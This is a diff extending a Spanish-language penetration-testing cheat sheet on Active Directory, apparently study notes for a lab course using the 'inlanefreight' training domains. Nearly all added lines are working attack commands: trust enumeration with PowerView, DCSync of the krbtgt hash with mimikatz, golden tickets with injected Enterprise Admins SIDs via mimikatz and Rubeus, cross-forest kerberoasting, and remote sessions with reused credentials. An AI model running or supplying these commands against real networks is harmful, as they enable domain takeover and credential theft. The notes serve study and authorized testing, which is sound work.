@@ -329,3 +329,47 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 #Buscando usuarios con no preauth activado
 
+----------  ----------  ----------  ----------
+	### Relacion de confianza
+Import-Module activedirectory
+Get-ADTrust -Filter *
+#Muestra relacion de confianza del dominio actual con otros y que tipo de relacion (booleanos)
+
+Import-Module PowerView.ps1
+Get-DomainTrust
+#Similar, pero con menos datos. Va mas al grano
+Get-DomainTrustMapping
+#Mapea mas en profundidad (en principio, no difiere mucho)
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+#Obtener usuarios de un dominio deconfianza obtenido con los comandos anteriores
+
+----------
+	### Attacking Domain Trusts - Child
+lsadump::dcsync /user:LOGISTICS\krbtgt
+#Obtener KRBTGT NTLM hash
+Get-DomainSID
+#SID del child domain
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+#Obtener SID de enterprise admin groups
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<GetDomainSID_SID> /krbtgt:<krbtg_NTLM_hash> /sids:<Get-DomainGroup_SID> /ptt
+#En mimikatz, solicito un golden ticket para el usuario y dominio especificado
+.\Rubeus.exe golden /rc4:<krbtg_NTLM_hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<GetDomainSID_SID>  /sids:<Get-DomainGroup_SID> /user:hacker /ptt
+#Solicitar godel ticket con rubeus
+klist
+#Para confirmar que este en memoria
+
+----------
+	### Attacking Domain Trusts - Cross-Forest
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+#Enumerar cuentas asociadas a SPNS con Get-DomainUser
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity <user comando anterior> |select samaccountname,memberof
+#Enumeracion del usuario que vino como output del comando anterior
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+#Si el usuario resulta ser domain admin, se puede intentar kerberoastearlo 
+
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+#Permite obetener las cuentas en el dominio que son miembros tambien de otro
+#Esto puede ser util si tenemos la contraseña o hash de la cuenta puesto que es muy probable que esta sea la misma
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential <domionio\usuario>
+#Ej de dom\usr: INLANEFREIGHT\administrator
+#Este comando nos permite autenticarnos a la maquina especificada con las credenciales
